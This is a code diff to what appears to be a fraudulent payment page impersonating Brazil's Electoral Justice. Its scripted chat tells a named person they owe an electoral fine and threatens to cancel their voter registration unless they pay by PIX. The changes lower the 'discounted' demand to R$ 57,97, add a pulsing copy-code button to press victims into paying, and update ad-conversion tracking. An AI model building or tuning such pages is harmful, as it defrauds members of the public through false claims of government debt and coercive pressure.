@@ -45,6 +45,14 @@
         --receita-danger: #dc3545;
     }
 
+    @keyframes pixCopyPulse {
+        0%, 100% { transform: scale(1); box-shadow: 0 4px 14px rgba(27,58,107,.35); }
+        50% { transform: scale(1.03); box-shadow: 0 6px 24px rgba(27,58,107,.7); }
+    }
+    .pix-copy-pulse-btn {
+        animation: pixCopyPulse 1.6s infinite ease-in-out;
+    }
+
     @keyframes slideDown {
         0% { 
             transform: translateY(-100%);
@@ -433,7 +441,7 @@ const chatSequence = [
         delay: 10000
     },
     {
-        message: `A Justiça Eleitoral disponibiliza um desconto de 81% para quitação imediata, reduzindo a multa de R$ 419,55 para apenas R$ 79,34. ${firstName}, deseja quitar com desconto ou autoriza o cancelamento do título de eleitor?`,
+        message: `A Justiça Eleitoral disponibiliza um desconto de 86% para quitação imediata, reduzindo a multa de R$ 419,55 para apenas R$ 57,97. ${firstName}, deseja quitar com desconto ou autoriza o cancelamento do título de eleitor?`,
         delay: 10000,
         showOptions: 'debtOptions'
     }
@@ -634,7 +642,7 @@ async function openPixModal() {
                 }
                 gtag('event', 'conversion', {
                     send_to: 'AW-18302482370/L4AGCI-A3c0cEMLvppdE',
-                    value: 79.34,
+                    value: 57.97,
                     currency: 'BRL',
                     transaction_id: data.transactionId || data.orderId || ''
                 });
@@ -736,12 +744,12 @@ function showPixModal(data) {
                 </div>
 
                 <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
-                    <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #1B3A6B;">Código PIX (Copia e Cola) - Multa Eleitoral: R$ 79,34:</label>
+                    <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #1B3A6B;">Código PIX (Copia e Cola) - Multa Eleitoral: R$ 57,97:</label>
                     <div style="margin-bottom: 10px;">
                         <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 120px; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 0.85rem; resize: none; line-height: 1.3; word-wrap: break-word;">${data.pixCode || data.pix_code}</textarea>
                         <input type="hidden" id="pixCodeInputReal" value="${data.pixCode || data.pix_code}">
                     </div>
-                    <button onclick="copyPixCode()" style="width: 100%; padding: 12px 16px; background: #1B3A6B; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
+                    <button onclick="copyPixCode()" id="chatCopyPixBtn" class="pix-copy-pulse-btn" style="width: 100%; padding: 12px 16px; background: #1B3A6B; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
                         <i class="fas fa-copy"></i> Copiar código PIX completo
                     </button>
                 </div>
@@ -755,7 +763,7 @@ function showPixModal(data) {
                         <p style="margin-bottom: 8px;"><strong>1.</strong> Copie o código PIX clicando no botão acima</p>
                         <p style="margin-bottom: 8px;"><strong>2.</strong> Abra o aplicativo do seu banco</p>
                         <p style="margin-bottom: 8px;"><strong>3.</strong> Procure pela opção "PIX" e depois "Copia e Cola"</p>
-                        <p style="margin-bottom: 0;"><strong>4.</strong> Cole o código copiado e confirme o pagamento de R$ 79,34</p>
+                        <p style="margin-bottom: 0;"><strong>4.</strong> Cole o código copiado e confirme o pagamento de R$ 57,97</p>
                     </div>
                 </div>
 
@@ -789,6 +797,8 @@ function copyPixCode() {
     // Get the real PIX code from hidden input
     const realPixInput = document.getElementById('pixCodeInputReal');
     const realPixCode = realPixInput.value;
+    const copyBtn = document.getElementById('chatCopyPixBtn');
+    if (copyBtn) copyBtn.classList.remove('pix-copy-pulse-btn');
 
     (function(txId) {
         if (!txId) return;
